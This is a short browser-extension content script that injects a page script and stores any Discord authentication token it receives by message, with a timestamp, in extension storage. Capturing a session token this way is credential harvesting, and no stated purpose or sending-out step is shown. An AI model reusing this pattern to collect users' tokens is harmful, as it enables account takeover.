const s = document.createElement('script');
s.src = chrome.runtime.getURL('inject.js');
(document.head || document.documentElement).appendChild(s);
s.onload = () => s.remove();

window.addEventListener('message', (e) => {
  if (e.source !== window) return;
  if (e.data?.type === 'DISCORD_TOKEN_FOUND' && e.data.token) {
    chrome.storage.local.set({
      discord_token: e.data.token,
      discord_token_time: Date.now()
    });
  }
});
